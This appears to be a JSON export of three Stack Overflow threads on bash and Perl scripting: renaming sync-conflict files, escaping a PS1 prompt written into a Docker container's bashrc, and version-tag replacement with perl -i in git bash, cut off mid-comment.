[{"tags": ["bash", "macos", "perl", "find", "rename"], "comments": [{"owner": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 2, "creation_date": 1496913931, "post_id": 44424514, "comment_id": 75860967, "body": "My first suggestion is to make a backup before you start anything."}, {"owner": {"reputation": 172529, "user_id": 140750, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/4c7af12cad08c95bc206a9636d164224?s=128&d=identicon&r=PG", "display_name": "William Pursell", "link": "https://stackoverflow.com/users/140750/william-pursell"}, "edited": false, "score": 0, "creation_date": 1496928722, "post_id": 44424514, "comment_id": 75871668, "body": "It would probably be easier to first search for zero size files and check if there is a corresponding conflict file.  That may not completely resolve the problem, but would be a good first step.  Then if you have remaining conflict files, compare the content and remove the conflict file if they match."}], "answers": [{"tags": [], "owner": {"reputation": 4578, "user_id": 2584475, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b73e3a5a31ca53c6e58b1679a86c7a48?s=128&d=identicon&r=PG", "display_name": "Jack", "link": "https://stackoverflow.com/users/2584475/jack"}, "is_accepted": false, "score": 0, "last_activity_date": 1496928328, "last_edit_date": 1496928328, "creation_date": 1496884490, "answer_id": 44425140, "question_id": 44424514, "link": "https://stackoverflow.com/questions/44424514/scripting-for-file-management-with-a-very-large-amount-of-files/44425140#44425140", "title": "Scripting for file management with a very large amount of files", "body": "<p>Create a function to fix the name:</p>\n\n<pre><code>$ function fixname() { file=\"$1\"; newname=$( echo \"$file\" | sed \"s/sync-conflict.*\\.jpg$/.jpg/\" );  if [ -f \"$newname\" -a ! -s \"$newname\" ]; then mv \"$file\" \"$newname\"; fi; }\n</code></pre>\n\n<p>Or, spread out a bit:</p>\n\n<pre><code>function fixname() {\n    file=\"$1\"\n    newname=$( echo \"$file\" | sed \"s/sync-conflict.*\\.jpg$/.jpg/\" )\n    # If empty file exists\n    if [ -f \"$newname\" -a ! -s \"$newname\" ]; then\n        mv \"$file\" \"$newname\"\n    fi\n}\n</code></pre>\n\n<p>Export the function:</p>\n\n<pre><code>$ export -f fixname\n</code></pre>\n\n<p>Run find to execute the function:</p>\n\n<pre><code>$ find . -type f -name \\*sync-conflict\\*.jpg -exec bash -c 'fixname {}' bash \\;\n</code></pre>\n\n<p>Caveat: It will not work with spaces or funky characters in the filenames.</p>\n"}, {"tags": [], "owner": {"reputation": 41204, "user_id": 1072112, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa3fecc914da2b7a82696d52729fc237?s=128&d=identicon&r=PG", "display_name": "ghoti", "link": "https://stackoverflow.com/users/1072112/ghoti"}, "is_accepted": false, "score": 0, "last_activity_date": 1496886631, "creation_date": 1496886631, "answer_id": 44425396, "question_id": 44424514, "link": "https://stackoverflow.com/questions/44424514/scripting-for-file-management-with-a-very-large-amount-of-files/44425396#44425396", "title": "Scripting for file management with a very large amount of files", "body": "<p><code>find</code> is great. But as you've noted, you need more.</p>\n\n<p>What <code>find</code> gets you in this scenario is the ability to search recursively and match certain patterns. As it happens as of Bash version 4, you can do that right in the shell.</p>\n\n<p>(Note that macOS ships with bash version 3, so for this solution, you'll need to install bash 4 from <a href=\"http://www.macports.org/\" rel=\"nofollow noreferrer\">Macports</a>, <a href=\"https://brew.sh/\" rel=\"nofollow noreferrer\">Homebrew</a> or <a href=\"http://www.finkproject.org/\" rel=\"nofollow noreferrer\">Fink</a>.)</p>\n\n<pre><code>$ shopt -s globstar nullglob\n$ for file in **/*sync-confilct2017*.*; do echo mv -v \"$file\" \"${file%sync-conf*}${file##*.}\"; done\nmv -v file.sync-confilct201705-4528.jpg file.jpg\nmv -v foo/bar.sync-confilct201705-4528.ext foo/bar.ext\n</code></pre>\n\n<p>You can remove the <code>echo</code> to actually run the <code>mv</code> command.</p>\n\n<p>The way this works is that the double asterisk, <code>**</code>, is treated by bash like a <code>*</code> that recurses. We're using parameter expansion to strip the parts of the filename we want in order to construct the \"target\" filename.</p>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1496991641, "post_id": 44428660, "comment_id": 75899363, "body": "@J.P.  I added a paragraph of explanation of <code>$RealBin</code> in the code (file-test operators need full path while <code>File::Find::Rule</code> provides a relative path, so when we use what the module returned we must amend it to the full path for <code>-z</code>).  It&#39;s the same thing I&#39;ve written as a comment to your other question but I don&#39;t know whether you saw it, thus this note.  Please let me know if anything else pops up."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1497294504, "post_id": 44428660, "comment_id": 76007263, "body": "@J.P Please do let me know if code explanations would be useful."}, {"owner": {"reputation": 25, "user_id": 8120942, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2911f3c208cdd49717dc1e4e3a860a?s=128&d=identicon&r=PG&f=1", "display_name": "J.P.", "link": "https://stackoverflow.com/users/8120942/j-p"}, "edited": false, "score": 0, "creation_date": 1497326264, "post_id": 44428660, "comment_id": 76016873, "body": "Thank you, I grasp what you are saying.  I&#39;ve taken your direction and put together something that works well so far.  I would be happy to post it.  What is the correct approach?   Should I just edit the original question and post the updated code?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 25, "user_id": 8120942, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2911f3c208cdd49717dc1e4e3a860a?s=128&d=identicon&r=PG&f=1", "display_name": "J.P.", "link": "https://stackoverflow.com/users/8120942/j-p"}, "edited": false, "score": 0, "creation_date": 1497327178, "post_id": 44428660, "comment_id": 76017098, "body": "@J.P.  Thanks for asking!  No, that&#39;s one thing you don&#39;t want to do.  Most of these questions get visited by other people later and it is good the keep the question as it was initially, so that the answers still make sense.  Then it may be a useful page, and some get a lot of visits long after the question was asked."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 25, "user_id": 8120942, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2911f3c208cdd49717dc1e4e3a860a?s=128&d=identicon&r=PG&f=1", "display_name": "J.P.", "link": "https://stackoverflow.com/users/8120942/j-p"}, "edited": false, "score": 0, "creation_date": 1497327319, "post_id": 44428660, "comment_id": 76017136, "body": "@J.P.  If there are things in the code that don&#39;t work as you expect them to then by all means post it as another question.  Even if things &quot;work&quot; but you don&#39;t know why (and have other expectations of that code) it may be a perfectly good question to ask. If it all works fine and you want a comment on your code, that&#39;s what <a href=\"https://codereview.stackexchange.com/\">Code-Review</a>  is for (one of StackExchange sites).  I think that their criteria are a little more stringent though."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 25, "user_id": 8120942, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2911f3c208cdd49717dc1e4e3a860a?s=128&d=identicon&r=PG&f=1", "display_name": "J.P.", "link": "https://stackoverflow.com/users/8120942/j-p"}, "edited": false, "score": 0, "creation_date": 1497327662, "post_id": 44428660, "comment_id": 76017242, "body": "@J.P.  Another way may be to post it as your own answer. It is legitimate to post your own answers, and this is a good idea when you don&#39;t get a full answer but you figure it out yourself.  It is not common to post it just so, but I&#39;ll be very happy to look over it; let me know with a comment if you do that."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 1, "last_activity_date": 1496991403, "last_edit_date": 1496991403, "creation_date": 1496904868, "answer_id": 44428660, "question_id": 44424514, "link": "https://stackoverflow.com/questions/44424514/scripting-for-file-management-with-a-very-large-amount-of-files/44428660#44428660", "title": "Scripting for file management with a very large amount of files", "body": "<p>One good tool in Perl for this is <a href=\"http://search.cpan.org/~rclamp/File-Find-Rule-0.34/lib/File/Find/Rule.pm\" rel=\"nofollow noreferrer\">File::Find::Rule</a>.  </p>\n\n<p>Find all <code>sync-conflict</code> files, then test whether corresponding files exist and are zero size</p>\n\n<pre><code>use warnings;\nuse strict;\nuse FindBin qw($RealBin);\nuse File::Copy qw(move);\nuse File::Find::Rule;\n\nmy $dir = shift || '.';  # top of hierarchy to search (from command line, or ./)\n\nmy @conflict_files = File::Find::Rule\n    -&gt;file-&gt;name('*sync-conflict*.jpg')-&gt;in($dir);\n\nforeach my $conflict (@conflict_files)\n{\n    my ($file) = $conflict =~ m|(.*)\\.sync-conflict|;\n    $file .= '.jpg';\n\n    if (-z \"$RealBin/$file\") {\n        print \"Rename $conflict to $file\\n\"\n        #move($conflict, $file) or warn \"Can't move $conflict to $file: $!\";\n    }\n }\n</code></pre>\n\n<p>This builds the file's name <code>file</code> for each <code>file.sync-conflict</code> file and applies <code>-z</code> <a href=\"http://perldoc.perl.org/functions/-X.html\" rel=\"nofollow noreferrer\">file test (-X)</a>, which tests for both existence and zero size. Then it renames the file using the core <a href=\"https://perldoc.perl.org/File/Copy.html\" rel=\"nofollow noreferrer\">File::Copy</a>.</p>\n\n<p>Note that file-test operators need the full path while <code>File::Find::Rule</code> returns the path relative to the <code>$dir</code> it searches. I use <code>$RealBin</code> provided by <a href=\"http://perldoc.perl.org/FindBin.html\" rel=\"nofollow noreferrer\">FindBin</a>, which is the path to the directory where the script was started with all links resolved,  to build the full path for <code>-z</code>.</p>\n\n<p>Uncomment the <code>move</code> line after sufficient testing (and with having made a backup first).</p>\n\n<p>The code makes some assumptions about file names, please adjust as needed.\nThe <code>$dir</code> supplied on the command line is expected to be relative to the script's directory.</p>\n"}], "owner": {"reputation": 25, "user_id": 8120942, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4f2911f3c208cdd49717dc1e4e3a860a?s=128&d=identicon&r=PG&f=1", "display_name": "J.P.", "link": "https://stackoverflow.com/users/8120942/j-p"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 138, "favorite_count": 0, "accepted_answer_id": 44428660, "answer_count": 3, "score": 1, "last_activity_date": 1496991403, "creation_date": 1496879569, "last_edit_date": 1496886449, "question_id": 44424514, "link": "https://stackoverflow.com/questions/44424514/scripting-for-file-management-with-a-very-large-amount-of-files", "title": "Scripting for file management with a very large amount of files", "body": "<p>I have a three OSX machine setup that was using syncthing to keep shared drives synchronized remotely.  Someone made some mistakes and a lot of files ended up getting renamed.</p>\n\n<p>So all throughout this drive I have situations where there's a file of size 0KB named,for example, <code>file.jpg</code> and another file with real size named \n<code>file.sync-confilct201705-4528.jpg</code>.  I need to search the entire drive recursively and while I find a file with the sync-conflict string in it, check to see if there is the same file without the 'sync-conflict' string along with a size of 0KB.  If there is, I need to rename the sync-conflict file to overwrite the 0KB file.</p>\n\n<p>I have considered tackling this with a bash script or a Perl script.  Using bash I think just using the 'find' command with -regex would get me started but I don't really know how to process the results and run the next find test.  I am studying and working on it.</p>\n\n<p>Same problem with Perl. I can get through the first step using File::Find:find and select what I need using regex to filter out the files, but there again I am stuck getting to the next step, which would be finding the original file in the same directory and performing the necessary file move function.</p>\n\n<p>In both of these cases I am willing to put in the time to figure it out, but I wonder what the caveats will be?  Can both of these scenarios handle recursing a large number of files without exception?  Is there perhaps a better approach anyone can recommend?</p>\n"}, {"tags": ["bash", "perl", "docker"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1496867427, "post_id": 44422088, "comment_id": 75842968, "body": "I realise that. You&#39;ve spoiled it now!"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1496867444, "post_id": 44422088, "comment_id": 75842981, "body": "Why are you using backticks in void context? Why not just use <code>system</code> and avoid one level of interpretation (the shell)?"}, {"owner": {"reputation": 187, "user_id": 7406399, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f4e1e31b67a7c3ebd9e8037b0c14d172?s=128&d=identicon&r=PG&f=1", "display_name": "Patrick", "link": "https://stackoverflow.com/users/7406399/patrick"}, "edited": false, "score": 0, "creation_date": 1496867492, "post_id": 44422088, "comment_id": 75843014, "body": "Is <code>system</code> a better practice? I didn&#39;t have a particular reason for using one over the other."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1496867547, "post_id": 44422088, "comment_id": 75843036, "body": "<code>\\n</code> is expanded by <code>echo -e</code>. Why are you using <code>-e</code> here?"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1496867581, "post_id": 44422088, "comment_id": 75843060, "body": "You&#39;re missing quotes around the value. Without them, <code>\\A</code> is interpreted by the shell as plain <code>A</code> during assignment to <code>PS1</code>."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1496867710, "post_id": 44422088, "comment_id": 75843128, "body": "You should build this up in layers. First edit <code>&#47;etc&#47;bashrc</code> until you get a line that works. Then create a shell command that correctly adds that line to <code>&#47;etc&#47;bashrc</code>. Then get that command to work in <code>docker exec</code>. Finally run that command from Perl."}, {"owner": {"reputation": 187, "user_id": 7406399, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f4e1e31b67a7c3ebd9e8037b0c14d172?s=128&d=identicon&r=PG&f=1", "display_name": "Patrick", "link": "https://stackoverflow.com/users/7406399/patrick"}, "edited": false, "score": 0, "creation_date": 1496867761, "post_id": 44422088, "comment_id": 75843154, "body": "Okay, thanks for the help. I&#39;ll give that a shot."}], "answers": [{"tags": [], "owner": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "is_accepted": true, "score": 0, "last_activity_date": 1496872616, "creation_date": 1496872616, "answer_id": 44423456, "question_id": 44422088, "link": "https://stackoverflow.com/questions/44422088/backslash-preservation-with-docker-echo-and-perl/44423456#44423456", "title": "Backslash preservation with Docker, echo, and Perl", "body": "<p>I would feed the prompt to <code>docker</code> via standard input, rather than use <code>bash</code> as you are. Then you need only run one command, <code>tee -a /etc/bashrc</code>; it will inherit its standard input from <code>docker</code>, whose standard input is the file handle <code>$fh</code>.</p>\n\n<pre><code>open my $fh, \"|-\", \"docker exec --privileged '$c_name' tee -a /etc/bashrc\";\nprintf $fh \"PS1=$prompt\\n\";\nclose $fh;\n</code></pre>\n"}], "owner": {"reputation": 187, "user_id": 7406399, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/f4e1e31b67a7c3ebd9e8037b0c14d172?s=128&d=identicon&r=PG&f=1", "display_name": "Patrick", "link": "https://stackoverflow.com/users/7406399/patrick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 273, "favorite_count": 0, "accepted_answer_id": 44423456, "answer_count": 1, "score": 0, "last_activity_date": 1496872616, "creation_date": 1496866839, "last_edit_date": 1496867116, "question_id": 44422088, "link": "https://stackoverflow.com/questions/44422088/backslash-preservation-with-docker-echo-and-perl", "title": "Backslash preservation with Docker, echo, and Perl", "body": "<p>I am using perl to call <code>docker exec</code> in a very specific way to echo information into <code>/etc/bashrc</code> within a Docker container.</p>\n\n<p>I have two Perl variables that I need interpolated into the echo command. <code>$c_name</code> will usually have a value of <code>test1</code> or something.<code>$net_ip</code> will usually have a value of <code>192.168.0.x</code></p>\n\n<pre><code>my $prompt = '[\\A][' . $c_name . '][' . $net_ip . '][\\w]\\n\\$ ';\n`docker exec --privileged $c_name bash -c \"echo -e 'PS1=$prompt' &gt;&gt; /etc/bashrc\"`;\n</code></pre>\n\n<p>This concatentation effort is about the fourth shot at this. I've also tried </p>\n\n<pre><code>`docker exec --privileged $c_name bash -c \"echo -e PS1='[\\A][$c_name][$net_ip][\\w]\\n\\$ ' &gt;&gt; /etc/bashrc\"`;\n</code></pre>\n\n<p>Neither of these work. When I do a <code>docker exec -it test1 /bin/bash</code> I get a prompt that looks like this: </p>\n\n<pre><code>bash: $: command not found\n[A][test1][192.168.0.13][w]\n</code></pre>\n\n<p>with my <code>/etc/bashrc</code> looking like the following:</p>\n\n<pre><code>PS1=[\\A][test1][192.168.0.13][\\w]\n$\n</code></pre>\n\n<p>Now this is kinda-correct. It looks like it didn't escape <code>\\n</code> and <code>\\$</code> That is a problem. But what's more concerning is that the prompt is not respecting the <code>\\A</code> and <code>\\w</code> there. Even when I do <code>source /etc/bashrc</code> from within the container, I'm still getting the error message above from Bash and my prompt stays the same. Is there some weird interaction with Docker and $PS1 I don't know about?</p>\n\n<p>What I want is at the end of my <code>/etc/bashrc</code> I want this line to exist, verbatim, with interpolated Perl $vars:</p>\n\n<pre><code>[\\A][$c_name][$net_ip][\\w]\\n\\$ \n</code></pre>\n\n<p>which, after Perl interpretation, might look like:</p>\n\n<pre><code>[\\A][test_container][10.0.0.2][/home/docker]\n$ \n</code></pre>\n\n<p>I've tried other attempts as well, such as trying to escape the backslashes with double <code>\\\\</code> (e.g. <code>[\\\\A]</code>, however, either Perl complains about not recognizing escaped characters (\"Unrecognized escape option at $linenumber) or it simply has the same results as above where the backslashes are not placed into /etc/bashrc.</p>\n\n<p>Note that when I'm in the container and I execute:</p>\n\n<pre><code>export PS1='[\\A][test1][192.168.0.13][\\w]\\n\\$ '\n</code></pre>\n\n<p>then the prompt is correct:</p>\n\n<pre><code>[20:26][test1][192.168.0.13][/]\n#\n</code></pre>\n"}, {"tags": ["linux", "git", "bash", "perl", "sed"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496864153, "post_id": 44421118, "comment_id": 75841223, "body": "Re &quot;<i>Note that the double-backslash appears to be required</i>&quot;, Shouldn&#39;t be. <code>printf &#39;%s\\n%s\\n&#39; &quot;\\.&quot; &quot;\\\\.&quot;</code> shows that <code>&quot;\\.&quot;</code> and <code>&quot;\\\\.&quot;</code> are functionally identical."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1497031641, "post_id": 44421118, "comment_id": 75925130, "body": "Please provide a minimal, runnable demonstration of the problem"}], "answers": [{"comments": [{"owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1496878533, "post_id": 44421377, "comment_id": 75847218, "body": "The OP is using a <code>perl</code> built with MinGW gcc: <code>C:\\&gt; &quot;\\Program Files\\git\\usr\\bin\\perl.exe&quot; -v</code>: <code>This is perl 5, version 22, subversion 1 (v5.22.1) built for x86_64-msys-thread-multi</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "edited": false, "score": 0, "creation_date": 1496897008, "post_id": 44421377, "comment_id": 75851516, "body": "@Sinan &#220;n&#252;r, Why are you telling me that? So I can test <code>-i</code> with it? I don&#39;t see how that helps me achieve that. Why didn&#39;t you do it?"}, {"owner": {"reputation": 2241, "user_id": 203118, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/b09bcf1e6791d661b5b4ed2f06a40d3c?s=128&d=identicon&r=PG", "display_name": "phpguru", "link": "https://stackoverflow.com/users/203118/phpguru"}, "edited": false, "score": 0, "creation_date": 1497030523, "post_id": 44421377, "comment_id": 75924546, "body": "I tried both, neither work for me. A .bak file is generated even though the target file is unchanged, I am using rm on the next line."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1497031618, "post_id": 44421377, "comment_id": 75925118, "body": "Re &quot;A .bak file is generated even though the target file is unchanged&quot;, That means the pattern doesn&#39;t match."}, {"owner": {"reputation": 2241, "user_id": 203118, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/b09bcf1e6791d661b5b4ed2f06a40d3c?s=128&d=identicon&r=PG", "display_name": "phpguru", "link": "https://stackoverflow.com/users/203118/phpguru"}, "edited": false, "score": 0, "creation_date": 1497032149, "post_id": 44421377, "comment_id": 75925401, "body": "Oh ok, I found the problem! Thanks for your help."}, {"owner": {"reputation": 2241, "user_id": 203118, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/b09bcf1e6791d661b5b4ed2f06a40d3c?s=128&d=identicon&r=PG", "display_name": "phpguru", "link": "https://stackoverflow.com/users/203118/phpguru"}, "edited": false, "score": 0, "creation_date": 1497032615, "post_id": 44421377, "comment_id": 75925639, "body": "I ended up with TAGNAME=&quot;$tagname&quot; perl -i -pe&#39;s:v[0-9]\\.[0-9]\\.[0-9]+:$ENV{TAGNAME}:g&#39; config/app.php and then on the next line rm config/app.php.bak"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 2, "last_activity_date": 1496865443, "last_edit_date": 1496865443, "creation_date": 1496864069, "answer_id": 44421377, "question_id": 44421118, "link": "https://stackoverflow.com/questions/44421118/how-to-write-a-dynamic-string-replacement-in-git-bash/44421377#44421377", "title": "How to write a dynamic string replacement in git bash?", "body": "<p><code>-i</code> doesn't work on Windows builds of <code>perl</code>.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>&gt;perl -i -pe1 foo\nCan't do inplace edit without backup.\n</code></pre>\n\n<p>That feature uses anonymous files, which aren't supported by Windows. That said, you're not using a Windows build of <code>perl</code> but a cygwin build or similar. It could be that your unix emulation environment emulates anonymous files, so that might not be the the problem. </p>\n\n<p>But if it is the problem, replacing <code>-i</code> with <code>-i.bak</code> will solve it. (Feel free to follow up with <code>rm config/app.php.bak</code>.)</p>\n\n<hr>\n\n<p>By the way, you are generating Perl code, which is fragile. (Tag names containing <code>:</code>, <code>\\</code>, <code>$</code> or <code>@</code> will cause the code to fail.) I recommend one of the following instead:</p>\n\n<pre><code>TAGNAME=\"$tagname\" perl -i -pe's:v[0-9]\\.[0-9]\\.[0-9]+:$ENV{TAGNAME}:g' config/app.php\n</code></pre>\n\n<p>or</p>\n\n<pre><code>perl -i -pe'\n   BEGIN { $tagname = shift(@ARGV); }\n   s:v[0-9]\\.[0-9]\\.[0-9]+:$tagname:g;\n' \"$tagname\" config/app.php\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496897205, "post_id": 44422004, "comment_id": 75851569, "body": "Your code suffers from an injection bug. Using <code>sed</code> correctly would be extremely complicated. KISS dictates you should avoid <code>sed</code>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496897393, "post_id": 44422004, "comment_id": 75851639, "body": "Even if you&#39;re ok with the injection bug, <code>sed</code> is no simpler that <code>perl</code> here. It&#39;s literally the exact same program except for the extra <code>\\ </code> before the <code>+</code> needed by <code>sed</code>."}, {"owner": {"reputation": 1254, "user_id": 2099489, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/toXzs.jpg?s=128&g=1", "display_name": "Miguel Ortiz", "link": "https://stackoverflow.com/users/2099489/miguel-ortiz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496919702, "post_id": 44422004, "comment_id": 75864905, "body": "Why would you use Perl which you already said is fragile? Sed has been around for many years and is the perfect tool to modify strings or lines of code <a href=\"http://sed.sourceforge.net/sedfaq6.html\" rel=\"nofollow noreferrer\">sed.sourceforge.net/sedfaq6.html</a>"}, {"owner": {"reputation": 1254, "user_id": 2099489, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/toXzs.jpg?s=128&g=1", "display_name": "Miguel Ortiz", "link": "https://stackoverflow.com/users/2099489/miguel-ortiz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496925168, "post_id": 44422004, "comment_id": 75868848, "body": "@ikegami using sed may be complex but not in this case."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1496939339, "post_id": 44422004, "comment_id": 75879801, "body": "I didn&#39;t say Perl is fragile; I said generating Perl code in a shell script is fragile. Generating sed code in a shell script like you did is equally fragile. In fact, your <code>sed</code> code-building suffers from exactly the same injection bug as the OP&#39;s Perl code building. Fix your injection bug if you think it&#39;s not complex; I think you&#39;ll find the Perl solution to be much simpler."}, {"owner": {"reputation": 2241, "user_id": 203118, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/b09bcf1e6791d661b5b4ed2f06a40d3c?s=128&d=identicon&r=PG", "display_name": "phpguru", "link": 